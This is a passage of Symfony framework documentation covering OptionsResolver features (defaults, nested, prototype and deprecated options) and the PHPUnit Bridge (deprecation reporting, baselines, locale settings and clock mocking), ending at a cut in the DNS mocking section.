            ]);
        }
    }

    class GoogleMailer extends Mailer
    {
        public function configureOptions(OptionsResolver $resolver): void
        {
            parent::configureOptions($resolver);

            $resolver->setDefault('host', function (Options $options, string $previousValue): string {
                if ('ssl' === $options['encryption']) {
                    return 'secure.example.org';
                }

                // Take default value configured in the base class
                return $previousValue;
            });
        }
    }

As seen in the example, this feature is mostly useful if you want to reuse the
default values set in parent classes in sub-classes.

Options without Default Values
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In some cases, it is useful to define an option without setting a default value.
This is useful if you need to know whether or not the user *actually* set
an option or not. For example, if you set the default value for an option,
it's not possible to know whether the user passed this value or if it comes
from the default::

    // ...
    class Mailer
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setDefault('port', 25);
        }

        // ...
        public function sendMail(string $from, string $to): void
        {
            // Is this the default value or did the caller of the class really
            // set the port to 25?
            if (25 === $this->options['port']) {
                // ...
            }
        }
    }

You can use :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setDefined`
to define an option without setting a default value. Then the option will only
be included in the resolved options if it was actually passed to
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::resolve`::

    // ...
    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setDefined('port');
        }

        // ...
        public function sendMail(string $from, string $to): void
        {
            if (array_key_exists('port', $this->options)) {
                echo 'Set!';
            } else {
                echo 'Not Set!';
            }
        }
    }

    $mailer = new Mailer();
    $mailer->sendMail($from, $to);
    // => Not Set!

    $mailer = new Mailer([
        'port' => 25,
    ]);
    $mailer->sendMail($from, $to);
    // => Set!

You can also pass an array of option names if you want to define multiple
options in one go::

    // ...
    class Mailer
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->setDefined(['port', 'encryption']);
        }
    }

The methods :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::isDefined`
and :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::getDefinedOptions`
let you find out which options are defined::

    // ...
    class GoogleMailer extends Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            parent::configureOptions($resolver);

            if ($resolver->isDefined('host')) {
                // One of the following was called:

                // $resolver->setDefault('host', ...);
                // $resolver->setRequired('host');
                // $resolver->setDefined('host');
            }

            $definedOptions = $resolver->getDefinedOptions();
        }
    }

Nested Options
~~~~~~~~~~~~~~

Suppose you have an option named ``spool`` which has two sub-options ``type``
and ``path``. Instead of defining it as a simple array of values, you can pass a
closure as the default value of the ``spool`` option with a
:class:`Symfony\\Component\\OptionsResolver\\OptionsResolver` argument. Based on
this instance, you can define the options under ``spool`` and its desired
default value::

    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefault('spool', function (OptionsResolver $spoolResolver): void {
                $spoolResolver->setDefaults([
                    'type' => 'file',
                    'path' => '/path/to/spool',
                ]);
                $spoolResolver->setAllowedValues('type', ['file', 'memory']);
                $spoolResolver->setAllowedTypes('path', 'string');
            });
        }

        public function sendMail(string $from, string $to): void
        {
            if ('memory' === $this->options['spool']['type']) {
                // ...
            }
        }
    }

    $mailer = new Mailer([
        'spool' => [
            'type' => 'memory',
        ],
    ]);

Nested options also support required options, validation (type, value) and
normalization of their values. If the default value of a nested option depends
on another option defined in the parent level, add a second ``Options`` argument
to the closure to access to them::

    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefault('sandbox', false);
            $resolver->setDefault('spool', function (OptionsResolver $spoolResolver, Options $parent): void {
                $spoolResolver->setDefaults([
                    'type' => $parent['sandbox'] ? 'memory' : 'file',
                    // ...
                ]);
            });
        }
    }

.. caution::

    The arguments of the closure must be type hinted as ``OptionsResolver`` and
    ``Options`` respectively. Otherwise, the closure itself is considered as the
    default value of the option.

In same way, parent options can access to the nested options as normal arrays::

    class Mailer
    {
        // ...

        public function configureOptions(OptionsResolver $resolver): void
        {
            $resolver->setDefault('spool', function (OptionsResolver $spoolResolver): void {
                $spoolResolver->setDefaults([
                    'type' => 'file',
                    // ...
                ]);
            });
            $resolver->setDefault('profiling', function (Options $options): void {
                return 'file' === $options['spool']['type'];
            });
        }
    }

.. note::

    The fact that an option is defined as nested means that you must pass
    an array of values to resolve it at runtime.

Prototype Options
~~~~~~~~~~~~~~~~~

There are situations where you will have to resolve and validate a set of
options that may repeat many times within another option. Let's imagine a
``connections`` option that will accept an array of database connections
with ``host``, ``database``, ``user`` and ``password`` each.

The best way to implement this is to define the ``connections`` option as prototype::

    $resolver->setDefault('connections', function (OptionsResolver $connResolver): void {
        $connResolver
            ->setPrototype(true)
            ->setRequired(['host', 'database'])
            ->setDefaults(['user' => 'root', 'password' => null]);
    });

According to the prototype definition in the example above, it is possible
to have multiple connection arrays like the following::

    $resolver->resolve([
        'connections' => [
            'default' => [
                'host' => '127.0.0.1',
                'database' => 'symfony',
            ],
            'test' => [
                'host' => '127.0.0.1',
                'database' => 'symfony_test',
                'user' => 'test',
                'password' => 'test',
            ],
            // ...
        ],
    ]);

The array keys (``default``, ``test``, etc.) of this prototype option are
validation-free and can be any arbitrary value that helps differentiate the
connections.

.. note::

    A prototype option can only be defined inside a nested option and
    during its resolution it will expect an array of arrays.

Deprecating the Option
~~~~~~~~~~~~~~~~~~~~~~

Once an option is outdated or you decided not to maintain it anymore, you can
deprecate it using the :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::setDeprecated`
method::

    $resolver
        ->setDefined(['hostname', 'host'])

        // this outputs the following generic deprecation message:
        // Since acme/package 1.2: The option "hostname" is deprecated.
        ->setDeprecated('hostname', 'acme/package', '1.2')

        // you can also pass a custom deprecation message (%name% placeholder is available)
        // %name% placeholder will be replaced by the deprecated option.
        // This outputs the following deprecation message:
        // Since acme/package 1.2: The option "hostname" is deprecated, use "host" instead.
        ->setDeprecated(
            'hostname',
            'acme/package',
            '1.2',
            'The option "%name%" is deprecated, use "host" instead.'
        )
    ;

.. note::

    The deprecation message will be triggered only if the option is being used
    somewhere, either its value is provided by the user or the option is evaluated
    within closures of lazy options and normalizers.

.. note::

    When using an option deprecated by you in your own library, you can pass
    ``false`` as the second argument of the
    :method:`Symfony\\Component\\OptionsResolver\\Options::offsetGet` method
    to not trigger the deprecation warning.

.. note::

    All deprecation messages are displayed in the profiler logs in the "Deprecations" tab.

Instead of passing the message, you may also pass a closure which returns
a string (the deprecation message) or an empty string to ignore the deprecation.
This closure is useful to only deprecate some of the allowed types or values of
the option::

    $resolver
        ->setDefault('encryption', null)
        ->setDefault('port', null)
        ->setAllowedTypes('port', ['null', 'int'])
        ->setDeprecated('port', 'acme/package', '1.2', function (Options $options, ?int $value): string {
            if (null === $value) {
                return 'Passing "null" to option "port" is deprecated, pass an integer instead.';
            }

            // deprecation may also depend on another option
            if ('ssl' === $options['encryption'] && 456 !== $value) {
                return 'Passing a different port than "456" when the "encryption" option is set to "ssl" is deprecated.';
            }

            return '';
        })
    ;

.. note::

    Deprecation based on the value is triggered only when the option is provided
    by the user.

This closure receives as argument the value of the option after validating it
and before normalizing it when the option is being resolved.

Ignore not defined Options
~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, all options are resolved and validated, resulting in a
:class:`Symfony\\Component\\OptionsResolver\\Exception\\UndefinedOptionsException`
if an unknown option is passed. You can ignore not defined options by using the
:method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::ignoreUndefined` method::

    // ...
    $resolver
        ->setDefined(['hostname'])
        ->setIgnoreUndefined(true)
    ;

    // option "version" will be ignored
    $resolver->resolve([
        'hostname' => 'acme/package',
        'version'  => '1.2.3'
    ]);

Chaining Option Configurations
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

In many cases you may need to define multiple configurations for each option.
For example, suppose the ``InvoiceMailer`` class has an ``host`` option that is required
and a ``transport`` option which can be one of ``sendmail``, ``mail`` and ``smtp``.
You can improve the readability of the code avoiding to duplicate option name for
each configuration using the :method:`Symfony\\Component\\OptionsResolver\\OptionsResolver::define`
method::

    // ...
    class InvoiceMailer
    {
        // ...
        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
            $resolver->define('host')
                ->required()
                ->default('smtp.example.org')
                ->allowedTypes('string')
                ->info('The IP address or hostname');

            $resolver->define('transport')
                ->required()
                ->default('transport')
                ->allowedValues('sendmail', 'mail', 'smtp');
        }
    }

Performance Tweaks
~~~~~~~~~~~~~~~~~~

With the current implementation, the ``configureOptions()`` method will be
called for every single instance of the ``Mailer`` class. Depending on the
amount of option configuration and the number of created instances, this may add
noticeable overhead to your application. If that overhead becomes a problem, you
can change your code to do the configuration only once per class::

    // ...
    class Mailer
    {
        private static array $resolversByClass = [];

        protected array $options;

        public function __construct(array $options = [])
        {
            // What type of Mailer is this, a Mailer, a GoogleMailer, ... ?
            $class = get_class($this);

            // Was configureOptions() executed before for this class?
            if (!isset(self::$resolversByClass[$class])) {
                self::$resolversByClass[$class] = new OptionsResolver();
                $this->configureOptions(self::$resolversByClass[$class]);
            }

            $this->options = self::$resolversByClass[$class]->resolve($options);
        }

        public function configureOptions(OptionsResolver $resolver): void
        {
            // ...
        }
    }

Now the :class:`Symfony\\Component\\OptionsResolver\\OptionsResolver` instance
will be created once per class and reused from that on. Be aware that this may
lead to memory leaks in long-running applications, if the default options contain
references to objects or object graphs. If that's the case for you, implement a
method ``clearOptionsConfig()`` and call it periodically::

    // ...
    class Mailer
    {
        private static array $resolversByClass = [];

        public static function clearOptionsConfig(): void
        {
            self::$resolversByClass = [];
        }

        // ...
    }

That's it! You now have all the tools and knowledge needed to process
options in your code.

Getting More Insights
~~~~~~~~~~~~~~~~~~~~~

Use the ``OptionsResolverIntrospector`` to inspect the options definitions
inside an ``OptionsResolver`` instance::

    use Symfony\Component\OptionsResolver\Debug\OptionsResolverIntrospector;
    use Symfony\Component\OptionsResolver\OptionsResolver;

    $resolver = new OptionsResolver();
    $resolver->setDefaults([
        'host' => 'smtp.example.org',
        'port' => 25,
    ]);

    $introspector = new OptionsResolverIntrospector($resolver);
    $introspector->getDefault('host'); // Retrieves "smtp.example.org"
The PHPUnit Bridge
==================

    The PHPUnit Bridge provides utilities to report legacy tests and usage of
    deprecated code and helpers for mocking native functions related to time,
    DNS and class existence.

It comes with the following features:

* Sets by default a consistent locale (``C``) for your tests (if you
  create locale-sensitive tests, use PHPUnit's ``setLocale()`` method);

* Auto-register ``class_exists`` to load Doctrine annotations (when used);

* It displays the whole list of deprecated features used in the application;

* Displays the stack trace of a deprecation on-demand;

* Provides a ``ClockMock``, ``DnsMock`` and ``ClassExistsMock`` classes for tests
  sensitive to time, network or class existence;

* Provides a modified version of PHPUnit that allows:

  #. separating the dependencies of your app from those of phpunit to prevent any unwanted constraints to apply;
  #. running tests in parallel when a test suite is split in several phpunit.xml files;
  #. recording and replaying skipped tests;

* It allows to create tests that are compatible with multiple PHPUnit versions
  (because it provides polyfills for missing methods, namespaced aliases for
  non-namespaced classes, etc.).

Installation
------------

.. code-block:: terminal

    $ composer require --dev symfony/phpunit-bridge

.. include:: /components/require_autoload.rst.inc

.. note::

    The PHPUnit bridge is designed to work with all maintained versions of
    Symfony components, even across different major versions of them. You should
    always use its very latest stable major version to get the most accurate
    deprecation report.

If you plan to :ref:`write assertions about deprecations <write-assertions-about-deprecations>` and use the regular
PHPUnit script (not the modified PHPUnit script provided by Symfony), you have
to register a new `test listener`_ called ``SymfonyTestsListener``:

.. code-block:: xml

    <!-- https://phpunit.de/manual/6.0/en/appendixes.configuration.html -->
    <phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:noNamespaceSchemaLocation="https://schema.phpunit.de/6.0/phpunit.xsd"
    >

        <!-- ... -->

        <listeners>
            <listener class="Symfony\Bridge\PhpUnit\SymfonyTestsListener"/>
        </listeners>
    </phpunit>

Usage
-----

.. seealso::

    This article explains how to use the PhpUnitBridge features as an independent
    component in any PHP application. Read the :doc:`/testing` article to learn
    about how to use it in Symfony applications.

Once the component is installed, a ``simple-phpunit`` script is created in the
``vendor/`` directory to run tests. This script wraps the original PHPUnit binary
to provide more features:

.. code-block:: terminal

    $ cd my-project/
    $ ./vendor/bin/simple-phpunit

After running your PHPUnit tests, you will get a report similar to this one:

.. code-block:: terminal

    $ ./vendor/bin/simple-phpunit
      PHPUnit by Sebastian Bergmann.

      Configuration read from <your-project>/phpunit.xml.dist
      .................

      Time: 1.77 seconds, Memory: 5.75Mb

      OK (17 tests, 21 assertions)

      Remaining deprecation notices (2)

      getEntityManager is deprecated since Symfony 2.1. Use getManager instead: 2x
        1x in DefaultControllerTest::testPublicUrls from App\Tests\Controller
        1x in BlogControllerTest::testIndex from App\Tests\Controller

The summary includes:

**Unsilenced**
    Reports deprecation notices that were triggered without the recommended
    `@-silencing operator`_.

**Legacy**
    Deprecation notices denote tests that explicitly test some legacy features.

**Remaining/Other**
    Deprecation notices are all other (non-legacy) notices, grouped by message,
    test class and method.

.. note::

    If you don't want to use the ``simple-phpunit`` script, register the following
    `PHPUnit event listener`_ in your PHPUnit configuration file to get the same
    report about deprecations (which is created by a `PHP error handler`_
    called :class:`Symfony\\Bridge\\PhpUnit\\DeprecationErrorHandler`):

    .. code-block:: xml

        <!-- phpunit.xml.dist -->
        <!-- ... -->
        <listeners>
            <listener class="Symfony\Bridge\PhpUnit\SymfonyTestsListener"/>
        </listeners>

Running Tests in Parallel
-------------------------

The modified PHPUnit script allows running tests in parallel by providing
a directory containing multiple test suites with their own ``phpunit.xml.dist``.

.. code-block:: terminal

    ├── tests/
    │   ├── Functional/
    │   │   ├── ...
    │   │   └── phpunit.xml.dist
    │   ├── Unit/
    │   │   ├── ...
    │   │   └── phpunit.xml.dist

.. code-block:: terminal

    $ ./vendor/bin/simple-phpunit tests/

The modified PHPUnit script will recursively go through the provided directory,
up to a depth of 3 subdirectories or the value specified by the environment variable
``SYMFONY_PHPUNIT_MAX_DEPTH``, looking for ``phpunit.xml.dist`` files and then
running each suite it finds in parallel, collecting their output and displaying
each test suite's results in their own section.

Trigger Deprecation Notices
---------------------------

Deprecation notices can be triggered by using ``trigger_deprecation`` from
the ``symfony/deprecation-contracts`` package::

    // indicates something is deprecated since version 1.3 of vendor-name/packagename
    trigger_deprecation('vendor-name/package-name', '1.3', 'Your deprecation message');

    // you can also use printf format (all arguments after the message will be used)
    trigger_deprecation('...', '1.3', 'Value "%s" is deprecated, use ...  instead.', $value);

Mark Tests as Legacy
--------------------

There are three ways to mark a test as legacy:

* (**Recommended**) Add the ``@group legacy`` annotation to its class or method;

* Make its class name start with the ``Legacy`` prefix;

* Make its method name start with ``testLegacy*()`` instead of ``test*()``.

.. note::

    If your data provider calls code that would usually trigger a deprecation,
    you can prefix its name with ``provideLegacy`` or ``getLegacy`` to silence
    these deprecations. If your data provider does not execute deprecated
    code, it is not required to choose a special naming just because the
    test being fed by the data provider is marked as legacy.

    Also be aware that choosing one of the two legacy prefixes will not mark
    tests as legacy that make use of this data provider. You still have to
    mark them as legacy tests explicitly.

Configuration
-------------

In case you need to inspect the stack trace of a particular deprecation
triggered by your unit tests, you can set the ``SYMFONY_DEPRECATIONS_HELPER``
`environment variable`_ to a regular expression that matches this deprecation's
message, enclosed with ``/``. For example, with:

.. code-block:: xml

    <!-- https://phpunit.de/manual/6.0/en/appendixes.configuration.html -->
    <phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:noNamespaceSchemaLocation="https://schema.phpunit.de/6.0/phpunit.xsd"
    >

        <!-- ... -->

        <php>
            <server name="KERNEL_CLASS" value="App\Kernel"/>
            <env name="SYMFONY_DEPRECATIONS_HELPER" value="/foobar/"/>
        </php>
    </phpunit>

`PHPUnit`_ will stop your test suite once a deprecation notice is triggered whose
message contains the ``"foobar"`` string.

.. _making-tests-fail:

Making Tests Fail
~~~~~~~~~~~~~~~~~

By default, any non-legacy-tagged or any non-silenced (`@-silencing operator`_)
deprecation notices will make tests fail. Alternatively, you can configure
an arbitrary threshold by setting ``SYMFONY_DEPRECATIONS_HELPER`` to
``max[total]=320`` for instance. It will make the tests fail only if a
higher number of deprecation notices is reached (``0`` is the default
value).

You can have even finer-grained control by using other keys of the ``max``
array, which are ``self``, ``direct``, and ``indirect``. The
``SYMFONY_DEPRECATIONS_HELPER`` environment variable accepts a URL-encoded
string, meaning you can combine thresholds and any other configuration setting,
like this: ``SYMFONY_DEPRECATIONS_HELPER='max[total]=42&max[self]=0&verbose=0'``

Internal deprecations
.....................

When you maintain a library, having the test suite fail as soon as a dependency
introduces a new deprecation is not desirable, because it shifts the burden of
fixing that deprecation to any contributor that happens to submit a pull request
shortly after a new vendor release is made with that deprecation.

To mitigate this, you can either use tighter requirements, in the hope that
dependencies will not introduce deprecations in a patch version, or even commit
the ``composer.lock`` file, which would create another class of issues.
Libraries will often use ``SYMFONY_DEPRECATIONS_HELPER=max[total]=999999``
because of this. This has the drawback of allowing contributions that introduce
deprecations but:

* forget to fix the deprecated calls if there are any;
* forget to mark appropriate tests with the ``@group legacy`` annotations.

By using ``SYMFONY_DEPRECATIONS_HELPER=max[self]=0``, deprecations that are
triggered outside the ``vendors`` directory will be accounted for separately,
while deprecations triggered from a library inside it will not (unless you reach
999999 of these), giving you the best of both worlds.

Direct and Indirect Deprecations
................................

When working on a project, you might be more interested in ``max[direct]``.
Let's say you want to fix deprecations as soon as they appear. A problem many
developers experience is that some dependencies they have tend to lag behind
their own dependencies, meaning they do not fix deprecations as soon as
possible, which means you should create a pull request on the outdated vendor,
and ignore these deprecations until your pull request is merged.

The ``max[direct]`` config allows you to put a threshold on direct deprecations
only, allowing you to notice when *your code* is using deprecated APIs, and to
keep up with the changes. You can still use ``max[indirect]`` if you want to
keep indirect deprecations under a given threshold.

Here is a summary that should help you pick the right configuration:

+------------------------+-----------------------------------------------------+
| Value                  | Recommended situation                               |
+========================+=====================================================+
| max[total]=0           | Recommended for actively maintained projects        |
|                        | with robust/no dependencies                         |
+------------------------+-----------------------------------------------------+
| max[direct]=0          | Recommended for projects with dependencies          |
|                        | that fail to keep up with new deprecations.         |
+------------------------+-----------------------------------------------------+
| max[self]=0            | Recommended for libraries that use                  |
|                        | the deprecation system themselves and               |
|                        | cannot afford to use one of the modes above.        |
+------------------------+-----------------------------------------------------+

Ignoring Deprecations
.....................

If your application has some deprecations that you can't fix for some reasons,
you can tell Symfony to ignore them.

You need first to create a text file where each line is a deprecation to ignore
defined as a regular expression. Lines beginning with a hash (``#``) are
considered comments:

.. code-block:: terminal

    # This file contains patterns to be ignored while testing for use of
    # deprecated code.

    %The "Symfony\\Component\\Validator\\Context\\ExecutionContextInterface::.*\(\)" method is considered internal Used by the validator engine\. (Should not be called by user\W+code\. )?It may change without further notice\. You should not extend it from "[^"]+"\.%
    %The "PHPUnit\\Framework\\TestCase::addWarning\(\)" method is considered internal%

Then, you can run the following command to use that file and ignore those deprecations:

.. code-block:: terminal

    $ SYMFONY_DEPRECATIONS_HELPER='ignoreFile=./tests/baseline-ignore' ./vendor/bin/simple-phpunit

Baseline Deprecations
.....................

You can also take a snapshot of deprecations currently triggered by your application
code, and ignore those during your test runs, still reporting newly added ones.
The trick is to create a file with the allowed deprecations and define it as the
"deprecation baseline". Deprecations inside that file are ignored but the rest of
deprecations are still reported.

First, generate the file with the allowed deprecations (run the same command
whenever you want to update the existing file):

.. code-block:: terminal

    $ SYMFONY_DEPRECATIONS_HELPER='generateBaseline=true&baselineFile=./tests/allowed.json' ./vendor/bin/simple-phpunit

This command stores all the deprecations reported while running tests in the
given file path and encoded in JSON.

Then, you can run the following command to use that file and ignore those deprecations:

.. code-block:: terminal

    $ SYMFONY_DEPRECATIONS_HELPER='baselineFile=./tests/allowed.json' ./vendor/bin/simple-phpunit

Disabling the Verbose Output
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, the bridge will display a detailed output with the number of
deprecations and where they arise. If this is too much for you, you can use
``SYMFONY_DEPRECATIONS_HELPER=verbose=0`` to turn the verbose output off.

It's also possible to change verbosity per deprecation type. For example, using
``quiet[]=indirect&quiet[]=other`` will hide details for deprecations of types
"indirect" and "other".

The ``quiet`` option hides details for the specified deprecation types, but will
not change the outcome in terms of exit code. That's what :ref:`max <making-tests-fail>`
is for, and both settings are orthogonal.

Disabling the Deprecation Helper
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

Set the ``SYMFONY_DEPRECATIONS_HELPER`` environment variable to ``disabled=1``
to completely disable the deprecation helper. This is useful to make use of the
rest of features provided by this component without getting errors or messages
related to deprecations.

Deprecation Notices at Autoloading Time
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, the PHPUnit Bridge uses ``DebugClassLoader`` from the
`ErrorHandler component`_ to throw deprecation notices at class autoloading
time. This can be disabled with the ``debug-class-loader`` option.

.. code-block:: xml

    <!-- phpunit.xml.dist -->
    <!-- ... -->
    <listeners>
        <listener class="Symfony\Bridge\PhpUnit\SymfonyTestsListener">
            <arguments>
                <array>
                    <!-- set this option to 0 to disable the DebugClassLoader integration -->
                    <element key="debug-class-loader"><integer>0</integer></element>
                </array>
            </arguments>
        </listener>
    </listeners>

Compile-time Deprecations
~~~~~~~~~~~~~~~~~~~~~~~~~

Use the ``debug:container`` command to list the deprecations generated during
the compiling and warming up of the container:

.. code-block:: terminal

    $ php bin/console debug:container --deprecations

Log Deprecations
~~~~~~~~~~~~~~~~

For turning the verbose output off and write it to a log file instead you can use
``SYMFONY_DEPRECATIONS_HELPER='logFile=/path/deprecations.log'``.

Setting The Locale For Tests
~~~~~~~~~~~~~~~~~~~~~~~~~~~~

By default, the PHPUnit Bridge forces the locale to ``C`` to avoid locale
issues in tests. This behavior can be changed by setting the
``SYMFONY_PHPUNIT_LOCALE`` environment variable to the desired locale:

.. code-block:: bash

    # .env.test
    SYMFONY_PHPUNIT_LOCALE="fr_FR"

Alternatively, you can set this environment variable in the PHPUnit
configuration file:

.. code-block:: xml

    <!-- https://phpunit.de/manual/6.0/en/appendixes.configuration.html -->
    <phpunit xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
        xsi:noNamespaceSchemaLocation="https://schema.phpunit.de/6.0/phpunit.xsd"
    >

        <!-- ... -->

        <php>
            <!-- ... -->
            <env name="SYMFONY_PHPUNIT_LOCALE" value="fr_FR"/>
        </php>
    </phpunit>

Finally, if you want to avoid the bridge to force any locale, you can set the
``SYMFONY_PHPUNIT_LOCALE`` environment variable to ``0``.

.. _write-assertions-about-deprecations:

Write Assertions about Deprecations
-----------------------------------

When adding deprecations to your code, you might like writing tests that verify
that they are triggered as required. To do so, the bridge provides the
``expectDeprecation()`` method that you can use on your test methods.
It requires you to pass the expected message, given in the same format as for
the `PHPUnit's assertStringMatchesFormat()`_ method. If you expect more than one
deprecation message for a given test method, you can use the method several
times (order matters)::

    use PHPUnit\Framework\TestCase;
    use Symfony\Bridge\PhpUnit\ExpectDeprecationTrait;

    class MyTest extends TestCase
    {
        use ExpectDeprecationTrait;

        /**
         * @group legacy
         */
        public function testDeprecatedCode(): void
        {
            // test some code that triggers the following deprecation:
            // trigger_deprecation('vendor-name/package-name', '5.1', 'This "Foo" method is deprecated.');
            $this->expectDeprecation('Since vendor-name/package-name 5.1: This "%s" method is deprecated');

            // ...

            // test some code that triggers the following deprecation:
            // trigger_deprecation('vendor-name/package-name', '4.4', 'The second argument of the "Bar" method is deprecated.');
            $this->expectDeprecation('Since vendor-name/package-name 4.4: The second argument of the "%s" method is deprecated.');
        }
    }

Display the Full Stack Trace
----------------------------

By default, the PHPUnit Bridge displays only deprecation messages.
To show the full stack trace related to a deprecation, set the value of ``SYMFONY_DEPRECATIONS_HELPER``
to a regular expression matching the deprecation message.

For example, if the following deprecation notice is thrown:

.. code-block:: bash

    1x: Doctrine\Common\ClassLoader is deprecated.
      1x in EntityTypeTest::setUp from Symfony\Bridge\Doctrine\Tests\Form\Type

Running the following command will display the full stack trace:

.. code-block:: terminal

    $ SYMFONY_DEPRECATIONS_HELPER='/Doctrine\\Common\\ClassLoader is deprecated\./' ./vendor/bin/simple-phpunit

Testing with Multiple PHPUnit Versions
--------------------------------------

When testing a library that has to be compatible with several versions of PHP,
the test suite cannot use the latest versions of PHPUnit because:

* PHPUnit 8 deprecated several methods in favor of other methods which are not
  available in older versions (e.g. PHPUnit 4);
* PHPUnit 8 added the ``void`` return type to the ``setUp()`` method, which is
  not compatible with PHP 5.5;
* PHPUnit switched to namespaced classes starting from PHPUnit 6, so tests must
  work with and without namespaces.

Polyfills for the Unavailable Methods
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When using the ``simple-phpunit`` script, PHPUnit Bridge injects polyfills for
most methods of the ``TestCase`` and ``Assert`` classes (e.g. ``expectException()``,
``expectExceptionMessage()``, ``assertContainsEquals()``, etc.). This allows writing
test cases using the latest best practices while still remaining compatible with
older PHPUnit versions.

Removing the Void Return Type
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

When running the ``simple-phpunit`` script with the ``SYMFONY_PHPUNIT_REMOVE_RETURN_TYPEHINT``
environment variable set to ``1``, the PHPUnit bridge will alter the code of
PHPUnit to remove the return type (introduced in PHPUnit 8) from ``setUp()``,
``tearDown()``, ``setUpBeforeClass()`` and ``tearDownAfterClass()`` methods.
This allows you to write a test compatible with both PHP 5 and PHPUnit 8.

Using Namespaced PHPUnit Classes
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

The PHPUnit bridge adds namespaced class aliases for most of the PHPUnit classes
declared without namespaces (e.g. ``PHPUnit_Framework_Assert``), allowing you to
always use the namespaced class declaration even when the test is executed with
PHPUnit 4.

Time-sensitive Tests
--------------------

Use Case
~~~~~~~~

If you have this kind of time-related tests::

    use PHPUnit\Framework\TestCase;
    use Symfony\Component\Stopwatch\Stopwatch;

    class MyTest extends TestCase
    {
        public function testSomething(): void
        {
            $stopwatch = new Stopwatch();

            $stopwatch->start('event_name');
            sleep(10);
            $duration = $stopwatch->stop('event_name')->getDuration();

            $this->assertEquals(10000, $duration);
        }
    }

You calculated the duration time of your process using the Stopwatch utilities to
:ref:`profile Symfony applications <profiling-applications>`. However, depending
on the load of the server or the processes running on your local machine, the
``$duration`` could for example be ``10.000023s`` instead of ``10s``.

This kind of tests are called transient tests: they are failing randomly
depending on spurious and external circumstances. They are often cause trouble
when using public continuous integration services like `Travis CI`_.

Clock Mocking
~~~~~~~~~~~~~

The :class:`Symfony\\Bridge\\PhpUnit\\ClockMock` class provided by this bridge
allows you to mock the PHP's built-in time functions ``time()``, ``microtime()``,
``sleep()``, ``usleep()``, ``gmdate()``, and ``hrtime()``. Additionally the
function ``date()`` is mocked so it uses the mocked time if no timestamp is
specified.

Other functions with an optional timestamp parameter that defaults to ``time()``
will still use the system time instead of the mocked time. This means that you
may need to change some code in your tests. For example, instead of ``new DateTime()``,
you should use ``DateTime::createFromFormat('U', (string) time())`` to use the mocked
``time()`` function.

To use the ``ClockMock`` class in your test, add the ``@group time-sensitive``
annotation to its class or methods. This annotation only works when executing
PHPUnit using the ``vendor/bin/simple-phpunit`` script or when registering the
following listener in your PHPUnit configuration:

.. code-block:: xml

    <!-- phpunit.xml.dist -->
    <!-- ... -->
    <listeners>
        <listener class="\Symfony\Bridge\PhpUnit\SymfonyTestsListener"/>
    </listeners>

.. note::

    If you don't want to use the ``@group time-sensitive`` annotation, you can
    register the ``ClockMock`` class manually by calling
    ``ClockMock::register(__CLASS__)`` and ``ClockMock::withClockMock(true)``
    before the test and ``ClockMock::withClockMock(false)`` after the test.

As a result, the following is guaranteed to work and is no longer a transient
test::

    use PHPUnit\Framework\TestCase;
    use Symfony\Component\Stopwatch\Stopwatch;

    /**
     * @group time-sensitive
     */
    class MyTest extends TestCase
    {
        public function testSomething(): void
        {
            $stopwatch = new Stopwatch();

            $stopwatch->start('event_name');
            sleep(10);
            $duration = $stopwatch->stop('event_name')->getDuration();

            $this->assertEquals(10000, $duration);
        }
    }

And that's all!

.. caution::

    Time-based function mocking follows the `PHP namespace resolutions rules`_
    so "fully qualified function calls" (e.g ``\time()``) cannot be mocked.

The ``@group time-sensitive`` annotation is equivalent to calling
``ClockMock::register(MyTest::class)``. If you want to mock a function used in a
different class, do it explicitly using ``ClockMock::register(MyClass::class)``::

    // the class that uses the time() function to be mocked
    namespace App;

    class MyClass
    {
        public function getTimeInHours(): void
        {
            return time() / 3600;
        }
    }

    // the test that mocks the external time() function explicitly
    namespace App\Tests;

    use App\MyClass;
    use PHPUnit\Framework\TestCase;
    use Symfony\Bridge\PhpUnit\ClockMock;

    /**
     * @group time-sensitive
     */
    class MyTest extends TestCase
    {
        public function testGetTimeInHours(): void
        {
            ClockMock::register(MyClass::class);

            $my = new MyClass();
            $result = $my->getTimeInHours();

            $this->assertEquals(time() / 3600, $result);
        }
    }

.. tip::

    An added bonus of using the ``ClockMock`` class is that time passes
    instantly. Using PHP's ``sleep(10)`` will make your test wait for 10
    actual seconds (more or less). In contrast, the ``ClockMock`` class
    advances the internal clock the given number of seconds without actually
    waiting that time, so your test will execute 10 seconds faster.

DNS-sensitive Tests
-------------------

Tests that make network connections, for example to check the validity of a DNS
record, can be slow to execute and unreliable due to the conditions of the
network. For that reason, this component also provides mocks for these PHP
functions:

* :phpfunction:`checkdnsrr`
* :phpfunction:`dns_check_record`
* :phpfunction:`getmxrr`
* :phpfunction:`dns_get_mx`
* :phpfunction:`gethostbyaddr`
* :phpfunction:`gethostbyname`
* :phpfunction:`gethostbynamel`
* :phpfunction:`dns_get_record`

Use Case
~~~~~~~~

Consider the following example that tests a custom class called ``DomainValidator``
which defines a ``checkDnsRecord`` option to also validate that a domain is
associated to a valid host::

